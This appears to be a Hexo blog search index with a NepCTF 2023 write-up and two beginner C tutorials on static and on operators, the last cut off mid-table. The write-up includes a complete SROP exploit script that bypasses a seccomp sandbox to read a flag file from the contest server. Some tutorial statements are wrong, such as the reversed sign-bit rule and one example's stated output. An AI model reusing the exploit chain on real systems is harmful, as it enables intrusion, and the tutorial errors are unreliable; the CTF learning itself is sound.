<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Nep摸鱼记</title>
      <link href="/2023/11/27/NepCTF%202023/"/>
      <url>/2023/11/27/NepCTF%202023/</url>
      
        <content type="html"><![CDATA[<h2 id="NepCTF-2023"><a href="#NepCTF-2023" class="headerlink" title="NepCTF 2023"></a>NepCTF 2023</h2><p>为什么开赛两分钟选择不打了？<br>答案很简单：<del>签到题格式打错了…运营姐姐没回我…48h…</del><br>炮灰pwn不会做！！！（其实可以做misc）</p><h3 id="Msic"><a href="#Msic" class="headerlink" title="Msic"></a>Msic</h3><h4 id="code"><a href="#code" class="headerlink" title="code"></a>code</h4><p>题目提示flag在环境变量中 <del>开始STFW</del><br><a href="https://blog.csdn.net/aspnet_lyc/article/details/20548767">https://blog.csdn.net/aspnet_lyc/article/details/20548767</a></p><pre><code class="c">#include &lt;stdio.h&gt; int main(int argc, char** argv, char** arge)&#123;    while(*arge)    &#123;        printf(&quot;%s\n&quot;, *arge++);    &#125;    return 0;&#125;</code></pre><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230814162812545.png" alt="image-20230814162812545"></p><h4 id="与AI共舞的哈夫曼"><a href="#与AI共舞的哈夫曼" class="headerlink" title="与AI共舞的哈夫曼"></a>与AI共舞的哈夫曼</h4><p>求助chat因为不会用<del>copilot</del></p><h4 id="ConnectedFive"><a href="#ConnectedFive" class="headerlink" title="ConnectedFive"></a>ConnectedFive</h4><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230814174205317.png" alt="image-20230814174205317"></p><p>五子棋 不会写脚本干下吧hh（求助chat也不是不行）</p><pre><code class="python">from pwn import *import randomr = remote(&#39;nepctf.1cepeak.cn&#39;, 31762)def getboard():    board = []    for i in range(15):        data = r.recvline().decode()[3:].replace(&#39;[&#39;, &#39; &#39;).replace(&#39;]&#39;, &#39; &#39;).strip()        data = data.split(&#39; &#39;)        board.append(data)    return boardtable = &#39;abcdefghijklmno&#39;while True:    r.recvline()    r.recvline()    r.recvline()    r.recvline()    res = r.recvline().decode()    if(int(res.split(&#39;:&#39;)[0]) &gt;= 38):        r.interactive()    print(res)    r.recvline()    r.recvline()    board = getboard()    random_x = random.randint(0, 14)    random_y = random.randint(0, 14)    while board[random_y][random_x] != &#39;.&#39;:        random_x = random.randint(0, 14)        random_y = random.randint(0, 14)    pos = table[random_x] + table[random_y]    r.recvline()    r.sendline(pos)    r.recvline()</code></pre><h4 id="陌生的语言"><a href="#陌生的语言" class="headerlink" title="陌生的语言"></a>陌生的语言</h4><p>  根据提示A同学 开始bing 结果 竟然 看过 （我有罪）</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230814195648669.png" alt="image-20230814195648669"></p><p>​    </p><h3 id="PWN复现"><a href="#PWN复现" class="headerlink" title="PWN复现"></a>PWN复现</h3><p>  不是我说 是真不会但是跟着复现cve 从中学到了很多</p><h4 id="srop"><a href="#srop" class="headerlink" title="srop"></a>srop</h4><p>题目提示classic pwn</p><p>先seccomp-tools查看是否有沙盒<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230816102445148.png" alt="image-20230816102445148"></p><p>really exist！<br>有沙盒，只能使用open，read，write函数. goto 0009中0009是return ALLOW说明允许执行.<br>若为goto 00010则被禁用. </p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230816104100112.png" alt="image-20230816104100112"></p><p>​    注意是call syscall函数而不是直接syscall 所以寄存器会有偏移</p><pre><code class="python">from pwn import *io = remote(&quot;nepctf.1cepeak.cn&quot;,30307)libc = ELF(&quot;./libc-2.27.so&quot;)elf = ELF(&quot;./pwn&quot;)context.log_level = &#39;debug&#39;context.arch = &quot;amd64&quot;io.recvuntil(&quot;welcome to NepCTF2023!&quot;)pop_rdi = 0x0000000000400813syscall = 0x4005B0bss_addr = elf.bss(0x500)read_function = SigreturnFrame()read_function.rdi = 0read_function.rsi = 0read_function.rdx = bss_addr-0x8read_function.rcx = 0x500read_function.rip = syscallread_function.rsp = bss_addrpayload = cyclic(0x38)+p64(pop_rdi)+p64(0xf)+p64(syscall)+bytes(read_function)io.send(payload)open = SigreturnFrame()open.rdi = 2open.rsi = bss_addr-0x8open.rdx = 0open.rcx = 0open.rip = syscallopen.rsp = bss_addr + 0x110read_function = SigreturnFrame()read_function.rdi = 0read_function.rsi = 3read_function.rdx = bss_addr - 0x200read_function.rcx = 0x100read_function.rip = syscallread_function.rsp = bss_addr + 0x220write_funtion = SigreturnFrame()write_funtion.rdi = 1write_funtion.rsi = 1write_funtion.rdx = bss_addr - 0x200write_funtion.rcx = 0x100write_funtion.rip = syscallwrite_funtion.rsp = bss_addr+0x30payload = b&#39;./flag\x00\x00&#39;+p64(pop_rdi)+p64(0xf)+p64(syscall)+bytes(open)payload = payload.ljust(0x108,b&#39;\x00&#39;)+p64(pop_rdi)+p64(0xf)+p64(syscall)+bytes(read_function)payload = payload.ljust(0x208,b&#39;\x00&#39;)+p64(pop_rdi)+p64(0xf)+p64(syscall)+bytes(write_funtion)io.send(payload)io.recv()io.recv()</code></pre><p>Nepctf{SROP_IT_IS_EAsY_6ee3e57b-3982-4924-844a-d362c3006b20}</p>]]></content>
      
      
      <categories>
          
          <category> 题目记录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn,知识碎片 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C探索碎片——关键字static作用</title>
      <link href="/2023/09/01/C%E6%8E%A2%E7%B4%A2%E7%A2%8E%E7%89%87%E2%80%94%E2%80%94static%E7%9A%84%E4%BD%9C%E7%94%A8/"/>
      <url>/2023/09/01/C%E6%8E%A2%E7%B4%A2%E7%A2%8E%E7%89%87%E2%80%94%E2%80%94static%E7%9A%84%E4%BD%9C%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h2 id="一、简述"><a href="#一、简述" class="headerlink" title="一、简述"></a>一、简述</h2><p>static意译是静态的，而作为C语言中常见的关键字之一，它的用法也贴切“静态”这一含义。</p><h2 id="二、用法"><a href="#二、用法" class="headerlink" title="二、用法"></a>二、用法</h2><ol><li><ul><li><strong>修饰局部变量</strong></li></ul></li></ol><p>下为static是否修饰局部变量对程序运行结果影响的对比。</p><pre><code class="c">#include&lt;stdio.h&gt;void play()&#123;    int a = 6;    a++;    printf(&quot;%d &quot;, a);&#125;int main()&#123;    int i = 0;    while (i &lt; 5)    &#123;        play();        i++;    &#125;    return 0;&#125;</code></pre><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p><p><img src="https://img-blog.csdnimg.cn/img_convert/cb3a80ccb2c62eeceb98bffabadbb269.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动">编辑</p><p>此为上图static未修饰局部变量的运行结果</p><pre><code class="c">#include&lt;stdio.h&gt;void play()&#123;    static int a = 6;    a++;    printf(&quot;%d &quot;, a);&#125;int main()&#123;    int i = 0;    while (i &lt; 5)    &#123;        play();        i++;    &#125;    return 0;&#125;</code></pre><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p><p><img src="https://img-blog.csdnimg.cn/img_convert/4b420992488352dce723db40cb016674.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动">编辑</p><p>此为static修饰局部变量的运行结果</p><p>由上述的对比观察可得：static修饰局部变量时改变了被修饰（静态局部）变量的生命周期。</p><p>我们知道局部变量的生命周期是进作用域开始，出作用域结束，而其作用域是变量所在的局部范围。深入剖析来说，static修饰局部变量时改变了变量的存储类型。将本来存储在栈区的局部变量存放在了静态区。存储类型的改变使得其生命周期变长，但并不影响变量的作用域。</p><h4 id="2-修饰全局变量"><a href="#2-修饰全局变量" class="headerlink" title="2.修饰全局变量"></a>2.修饰全局变量</h4><p>下为static是否修饰全局变量对程序运行结果影响的对比。</p><p><img src="https://img-blog.csdnimg.cn/img_convert/b8b3d989de9c69ddbf491862d2066dc0.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动">编辑</p><blockquote><p>用extern声明外部符号使得在两个文件中可以达到“一次定义，多次声明”的效果。<br> 注意：extern只能用来声明全局变量！</p></blockquote><p><img src="https://img-blog.csdnimg.cn/img_convert/1215a0c458837f0883569331440183c5.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动">编辑</p><p>当用static修饰全局变量后，程序报错无法运行。</p><p>已知全局变量具有外部链接属性，上图对比分析得：static修饰全局变量之后将其（静态全局变量）外部链接属性变成了内部链接属性。此时的全局变量只能在自己所在的.C文件中使用，对其他文件无法链接使用。即static对全局变量进行修饰改变了其作用域的范围，由原来的整个工程可见变为本源文件可见。</p><h4 id="3-修饰函数"><a href="#3-修饰函数" class="headerlink" title="3.修饰函数"></a>3.修饰函数</h4><p>下为static是否修饰全局变量对程序运行结果影响的对比。</p><p><img src="https://img-blog.csdnimg.cn/img_convert/a2a0dd86fadcd5cc30ec0d88437f5fae.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动">编辑</p><p><img src="https://img-blog.csdnimg.cn/img_convert/e00d77cdfa029bdbe513811525802465.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动">编辑</p><p>此为为被static修饰时程序运行结果</p><p><img src="https://img-blog.csdnimg.cn/img_convert/436508929245bdfd15f062208af6e666.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动">编辑</p><p>程序报错 无法运行</p><p>函数也具有外部链接属性，由上分析可得相同结论：static修饰函数（静态函数）后将其外部链接属性变为内部链接属性，无法链接使用，只可在自己所在.c文件中使用。</p><h4 id="三、总结"><a href="#三、总结" class="headerlink" title="三、总结"></a>三、总结</h4><p>static修饰局部变量时将其生命周期延长但作用域未发生改变。</p><p>static修饰全局变量和函数时将其外部链接属性变为内部链接属性，使其只能在所在文件中使用。</p><h4 id="四、补充"><a href="#四、补充" class="headerlink" title="四、补充"></a>四、补充</h4><p>以下内容只为简单提到，后续学习过程中会专门做分享探讨。</p><h5 id="1-有关C语言内存分区"><a href="#1-有关C语言内存分区" class="headerlink" title="1.有关C语言内存分区"></a>1.有关C语言内存分区</h5><p><img src="https://img-blog.csdnimg.cn/img_convert/b90c659e4affce80d1838890434a951f.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动">编辑</p><h5 id="2-有关C语言三种链接属性"><a href="#2-有关C语言三种链接属性" class="headerlink" title="2.有关C语言三种链接属性"></a>2.有关C语言三种链接属性</h5><p>链接属性（linkage）分为三种——外部（external）、内部（internal）、无（none）。</p><p>注意：*链接属性的改变不会改变作用域。</p><p>*链接属性意味着能不能访问变量及能不能在文件中定义同名变量或函数名。</p>]]></content>
      
      
      <categories>
          
          <category> C语言 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C语言 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C探索碎片——操作符</title>
      <link href="/2023/09/01/C%E6%8E%A2%E7%B4%A2%E7%A2%8E%E7%AF%87%E2%80%94%E2%80%94%E6%93%8D%E4%BD%9C%E7%AC%A6/"/>
      <url>/2023/09/01/C%E6%8E%A2%E7%B4%A2%E7%A2%8E%E7%AF%87%E2%80%94%E2%80%94%E6%93%8D%E4%BD%9C%E7%AC%A6/</url>
      
        <content type="html"><![CDATA[<p>C的探索碎片——操作符</p><p> <img src="https://img-blog.csdnimg.cn/img_convert/2f25a996e53a0589036894fc5c92a086.gif" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p><ol><li><h3 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h3></li></ol><p>算术操作符</p><p>移位操作符</p><p>位操作符</p><p>赋值操作符</p><p>单目操作符</p><p>关系操作符</p><p>逻辑操作符</p><p>条件操作符</p><p>逗号表达式</p><p>下标引用、函数调用和结构成员</p><h4 id="一-算数操作符"><a href="#一-算数操作符" class="headerlink" title="一.算数操作符"></a>一.算数操作符</h4><pre><code class="plaintext">+  -  *  /  % </code></pre><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p><p>+、-、*此类数学中常见的算数符号我们再熟悉不过，需要注意的是&#x2F;（除），%（取余）之间的区别。</p><p>例：</p><pre><code class="c">#include&lt;stdio,h&gt;int main()&#123;    int a = 10;    printf(&quot;%d&quot;,a/3);//结果为3    printf(&quot;%d&quot;,a%3);//结果为1    return 0;&#125;</code></pre><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p><p>注意：1.除%操作符之外。其他几个操作符可以作用于整数和浮点数。</p><p>2.&#x2F;操作符运算时若两个操作数中含浮点数则执行浮点数除法（%lf打印结果）；若两操作数都为整数则执行整数除法。</p><p>3.%操作符的两个操作数必须为整数。</p><h4 id="二、移位操作符"><a href="#二、移位操作符" class="headerlink" title="二、移位操作符"></a>二、移位操作符</h4><pre><code class="plaintext">&lt;&lt;  左移操作符&gt;&gt;  右移操作符注：移位操作符的操作数只能是整数。</code></pre><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p><p><em>移位操作符移动的是二进制的位，</em>而整数在内存中以补码的形式进行存储，屏幕上又以原码显示。</p><p>补充：</p><p><strong>原码</strong>：把一个数按正负直接翻译成二进制；</p><p><strong>反码</strong>：对原码进行按位取（即0变为1，1变为0）反得到反码；</p><p><strong>补码</strong>：反码+1得补码。</p><p>对于正整数原码反码补码相同，负整数则需计算。</p><p>计算方法：原码符号位（二进制表示的最高一位，是0表示为负数，是1表示为正数）不变，其他位按位取反得到反码，+1得到补码。</p><p><img src="https://img-blog.csdnimg.cn/img_convert/577aafbe300b6819adb36ad9ca0b8713.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动">编辑</p><p>移位规则：</p><ol><li>左移操作符：左边抛弃、右边补0。</li></ol><p><img src="https://img-blog.csdnimg.cn/img_convert/7dea2e4433fabdfafcc5e51f99be91f8.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动">编辑</p><ol><li>右移操作符（由编译器决定）：</li></ol><p>逻辑移位</p><p>左边用0填充，右边丢弃。</p><p><img src="https://img-blog.csdnimg.cn/img_convert/97b52d3e735c5b8e80b4087060038946.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动">编辑</p><p>算术移位</p><p>左边用原该值的符号位填充，右边丢弃。</p><p><img src="https://img-blog.csdnimg.cn/img_convert/c94a1583fad019f42f8fafa14d6897e5.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动">编辑</p><p>警告⚠：</p><p>对于移位运算符，不要移动负数位，这个是标准未定义的。</p><h4 id="三、位操作符"><a href="#三、位操作符" class="headerlink" title="三、位操作符"></a>三、位操作符</h4><pre><code class="plaintext">&amp;//按位与|//按位或^//按位异或注：它们的操作数必须为整数。</code></pre><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p><p>均对二进制进行操作。</p><p>&amp;：有0为0，均1为1；</p><p>|：有 1为1，均0为0；</p><p>^：相同为0，相异为1，且保证不会栈溢出。</p><p>小tip：</p><pre><code class="plaintext">a ^ a = 0;0 ^ a = a;</code></pre><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p><h4 id="四、赋值操作符"><a href="#四、赋值操作符" class="headerlink" title="四、赋值操作符"></a>四、赋值操作符</h4><p>其实就是对“&#x3D;”的运用。</p><pre><code class="plaintext">赋值操作符可以连续使用，比如：int a = 10;int x = 0;int y = 20;a = x = y+1;//连续赋值</code></pre><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p><p><strong>复合赋值符</strong></p><p>+&#x3D;</p><p>-&#x3D;</p><p>*&#x3D;</p><p>&#x2F;&#x3D;</p><p>%&#x3D;</p><p>&gt;&gt;&#x3D;</p><p>&lt;&lt;&#x3D;</p><p>&amp;&#x3D;</p><p>|&#x3D;</p><p>^&#x3D;</p><p>可以自己进行实践探索具体功能🌸</p><h4 id="五、单目操作符"><a href="#五、单目操作符" class="headerlink" title="五、单目操作符"></a>五、单目操作符</h4><pre><code class="plaintext">! 逻辑反操作- 负值+ 正值&amp; 取地址sizeof 操作数的类型长度（以字节为单位）~ 对一个数的二进制按位取反-- 前置、后置--++ 前置、后置++* 间接访问操作符(解引用操作符)(类型) 强制类型转换</code></pre><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p><h4 id="六、关系操作符"><a href="#六、关系操作符" class="headerlink" title="六、关系操作符"></a>六、关系操作符</h4><pre><code class="plaintext">&gt;&gt;=&lt;&lt;=!= 用于测试“不相等”== 用于测试“相等”</code></pre><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p><p>注意：编程过程中不要混淆&#x3D;&#x3D;和&#x3D;，不然会变成bug小子。</p><h4 id="七、逻辑操作符"><a href="#七、逻辑操作符" class="headerlink" title="七、逻辑操作符"></a>七、逻辑操作符</h4><pre><code class="plaintext">&amp;&amp; 逻辑与|| 逻辑或</code></pre><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p><p>区分<strong>逻辑与</strong>和<strong>按位与</strong></p><p>区分<strong>逻辑或</strong>和<strong>按位或</strong></p><pre><code class="plaintext">1&amp;2-----&gt;01&amp;&amp;2----&gt;11|2-----&gt;31||2----&gt;1</code></pre><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p><h4 id="八、条件操作符"><a href="#八、条件操作符" class="headerlink" title="八、条件操作符"></a>八、条件操作符</h4><pre><code class="plaintext">exp1 ? exp2 : exp3</code></pre><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p><p>懒鬼懒得解释了直接上🌰</p><p>例：</p><pre><code class="plaintext">#include&lt;stdio.h&gt;int main()&#123;    int a, b;    scanf(&quot;%d%d&quot;, &amp;a, &amp;b);    int c = (a &gt; b) ? a : b;    printf(&quot;%d&quot;, c);    return 0;&#125;//输入5 3 结果为5 输入3 5 结果为3</code></pre><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p><h4 id="九、逗号表达式"><a href="#九、逗号表达式" class="headerlink" title="九、逗号表达式"></a>九、逗号表达式</h4><pre><code class="plaintext">exp1, exp2, exp3, …expN</code></pre><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p><p>逗号表达式，就是用逗号隔开的多个表达式。</p><p>逗号表达式，从左向右依次执行。整个表达式的结果是最后一个表达式的结果。</p><h4 id="十、下标引用、函数调用和结构成员"><a href="#十、下标引用、函数调用和结构成员" class="headerlink" title="十、下标引用、函数调用和结构成员"></a>十、下标引用、函数调用和结构成员</h4><p>\1. [ ] 下标引用操作符</p><p>操作数：一个数组名 + 一个索引值</p><pre><code class="plaintext">int arr[6];//创建数组arr[6] = 10;//实用下标引用操作符。[ ]的两个操作数是arr和6</code></pre><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p><p>\2. ( ) 函数调用操作符</p><p>接受一个或者多个操作数：第一个操作数是函数名，剩余的操作数就是传递给函数的参数。</p><pre><code class="c">#include &lt;stdio.h&gt;void test1()&#123;printf(&quot;hehe\n&quot;);&#125;void test2(const char *str)&#123;printf(&quot;%s\n&quot;, str);&#125;int main()&#123;test1(); //实用（）作为函数调用操作符。test2(&quot;hello bit.&quot;);//实用（）作为函数调用操作符。return 0;&#125;</code></pre><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p><p>\3. 访问一个结构的成员</p><table><thead><tr><th>. - &gt;</th><th>结构体.成员名 结构体指针-&gt;成员名</th></tr></thead><tbody><tr><td></td><td></td></tr></tbody></table><pre><code class="c">#include&lt;stdio.h&gt;struct S&#123;    int num ;    char c ;&#125;;int main()&#123;    struct S s = &#123;6,&#39;a&#39;&#125;;    printf(&quot;%d\n&quot;, s.num);    printf(&quot;%c&quot;, s.c);&#125;//打印出6 a</code></pre><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p><pre><code class="c">#include&lt;stdio.h&gt;struct S&#123;    int num ;    char c ;&#125;;void test(struct S* p)&#123;    printf(&quot;%d\n&quot;, p-&gt;num);    printf(&quot;%c&quot;, p-&gt;c);&#125;int main()&#123;    struct S s = &#123;6,&#39;a&#39;&#125;;    test(&amp;s);    return 0;&#125;//打印出6 a</code></pre><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p><ol><li><h3 id="操作符属性"><a href="#操作符属性" class="headerlink" title="操作符属性"></a>操作符属性</h3></li></ol><p>*<strong>复杂表达式的求值有三个影响的因素：*</strong></p><p>\1. 操作符的优先级</p><p>\2. 操作符的结合性</p><p>\3. 是否控制求值顺序。</p><p>💫<strong>两个相邻的操作符先执行哪个？取决于他们的优先级；如果两者的优先级相同，取决于他们的结合性。</strong></p><ol><li><h3 id="操作符的优先级"><a href="#操作符的优先级" class="headerlink" title="操作符的优先级"></a>操作符的优先级</h3></li></ol><table><thead><tr><th>操作 符</th><th>描述</th><th>用法示例</th><th>结果类型</th><th>结合性</th><th>是否控制求值顺序</th></tr></thead><tbody><tr><td>（）</td><td>聚组</td><td>（表达式）</td><td>与表达 式同</td><td>N&#x2F;A（不适用）</td><td>否</td></tr><tr><td>（）</td><td>函数调用</td><td>rexp（rexp，…,rexp）</td><td>rexp</td><td>L-R（左到右）</td><td>否</td></tr><tr><td>[ ]</td><td>下标引用</td><td>rexp[rexp]</td><td>lexp</td><td>L-R</td><td>否</td></tr><tr><td>.</td><td>访问结构成员</td><td>lexp.member_name</td><td>lexp</td><td>L-R</td><td>否</td></tr><tr><td>-&gt;</td><td>访问结构指针成员</td><td>rexp-&gt;member_name</td><td>lexp</td><td>L-R</td><td>否</td></tr><tr><td>++</td><td>后缀自增</td><td>lexp ++</td><td>rexp</td><td>L-R</td><td>否</td></tr><tr><td>–</td><td>后缀自减</td><td>lexp –</td><td>rexp</td><td>L-R</td><td>否</td></tr><tr><td>!</td><td>逻辑反</td><td>! rexp</td><td>rexp</td><td>R-L（右到左）</td><td>否</td></tr><tr><td>~</td><td>按位取反</td><td>~ rexp</td><td>rexp</td><td>R-L</td><td>否</td></tr><tr><td>+</td><td>单目，表示正值</td><td>+ rexp</td><td>rexp</td><td>R-L</td><td>否</td></tr><tr><td>-</td><td>单目，表示负值</td><td>- rexp</td><td>rexp</td><td>R-L</td><td>否</td></tr><tr><td>++</td><td>前缀自增</td><td>++ lexp</td><td>rexp</td><td>R-L</td><td>否</td></tr><tr><td>–</td><td>前缀自减</td><td>– lexp</td><td>rexp</td><td>R-L</td><td>否</td></tr><tr><td>*</td><td>间接访问</td><td>* rexp</td><td>lexp</td><td>R-L</td><td>否</td></tr><tr><td>&amp;</td><td>取地址</td><td>&amp; lexp</td><td>rexp</td><td>R-L</td><td>否</td></tr><tr><td>sizeof</td><td>取其长度，以字节 表示</td><td>sizeof rexp sizeof(类 型)</td><td>rexp</td><td>R-L</td><td>否</td></tr><tr><td>(类 型）</td><td>类型转换</td><td>(类型) rexp</td><td>rexp</td><td>R-L</td><td>否</td></tr><tr><td>*</td><td>乘法</td><td>rexp * rexp</td><td>rexp</td><td>L-R</td><td>否</td></tr><tr><td>&#x2F;</td><td>除法</td><td>rexp &#x2F; rexp</td><td>rexp</td><td>L-R</td><td>否</td></tr><tr><td>%</td><td>整数取余</td><td>rexp % rexp</td><td>rexp</td><td>L-R</td><td>否</td></tr><tr><td>+</td><td>加法</td><td>rexp + rexp</td><td>rexp</td><td>L-R</td><td>否</td></tr><tr><td>-</td><td>减法</td><td>rexp - rexp</td><td>rexp</td><td>L-R</td><td>否</td></tr><tr><td>&lt;&lt;</td><td>左移位</td><td>rexp &lt;&lt; rexp</td><td>rexp</td><td>L-R</td><td>否</td></tr><tr><td>&gt;&gt;</td><td>右移位</td><td>rexp &gt;&gt; rexp</td><td>rexp</td><td>L-R</td><td>否</td></tr><tr><td>&gt;</td><td>大于</td><td>rexp &gt; rexp</td><td>rexp</td><td>L-R</td><td>否</td></tr><tr><td>&gt;&#x3D;</td><td>大于等于</td><td>rexp &gt;&#x3D; rexp</td><td>rexp</td><td>L-R</td><td>否</td></tr><tr><td>&lt;</td><td>小于</td><td>rexp &lt; rexp</td><td>rexp</td><td>L-R</td><td>否</td></tr><tr><td>&lt;&#x3D;</td><td>小于等于</td><td>rexp &lt;&#x3D; rexp</td><td>rexp</td><td>L-R</td><td>否</td></tr><tr><td>&#x3D;&#x3D;</td><td>等于</td><td>rexp &#x3D;&#x3D; rexp</td><td>rexp</td><td>L-R</td><td>否</td></tr><tr><td>!&#x3D;</td><td>不等于</td><td>rexp !&#x3D; rexp</td><td>rexp</td><td>L-R</td><td>否</td></tr><tr><td>&amp;</td><td>位与</td><td>rexp &amp; rexp</td><td>rexp</td><td>L-R</td><td>否</td></tr><tr><td>^</td><td>位异或</td><td>rexp ^ rexp</td><td>rexp</td><td>L-R</td><td>否</td></tr><tr><td>|</td><td>位或</td><td>rexp | rexp</td><td>rexp</td><td>L-R</td><td>否</td></tr><tr><td>&amp;&amp;</td><td>逻辑与</td><td>rexp &amp;&amp; rexp</td><td>rexp</td><td>L-R</td><td>是</td></tr><tr><td>||</td><td>逻辑或</td><td>rexp || rexp</td><td>rexp</td><td>L-R</td><td>是</td></tr><tr><td>? :</td><td>条件操作符</td><td>rexp ? rexp : rexp</td><td>rexp</td><td>N&#x2F;A</td><td>是</td></tr><tr><td>&#x3D;</td><td>赋值</td><td>lexp &#x3D; rexp</td><td>rexp</td><td>R-L</td><td>否</td></tr><tr><td>+&#x3D;</td><td>以…加</td><td>lexp +&#x3D; rexp</td><td>rexp</td><td>R-L</td><td>否</td></tr><tr><td>-&#x3D;</td><td>以…减</td><td>lexp -&#x3D; rexp</td><td>rexp</td><td>R-L</td><td>否</td></tr><tr><td>*&#x3D;</td><td>以…乘</td><td>lexp *&#x3D; rexp</td><td>rexp</td><td>R-L</td><td>否</td></tr><tr><td>&#x2F;&#x3D;</td><td>以…除</td><td>lexp &#x2F;&#x3D; rexp</td><td>rexp</td><td>R-L</td><td>否</td></tr><tr><td>%&#x3D;</td><td>以…取模</td><td>lexp %&#x3D; rexp</td><td>rexp</td><td>R-L</td><td>否</td></tr><tr><td>&lt;&lt;&#x3D;</td><td>以…左移</td><td>lexp &lt;&lt;&#x3D; rexp</td><td>rexp</td><td>R-L</td><td>否</td></tr><tr><td>&gt;&gt;&#x3D;</td><td>以…右移</td><td>lexp &gt;&gt;&#x3D; rexp</td><td>rexp</td><td>R-L</td><td>否</td></tr><tr><td>&amp;&#x3D;</td><td>以…与</td><td>lexp &amp;&#x3D; rexp</td><td>rexp</td><td>R-L</td><td>否</td></tr><tr><td>^&#x3D;</td><td>以…异或</td><td>lexp ^&#x3D; 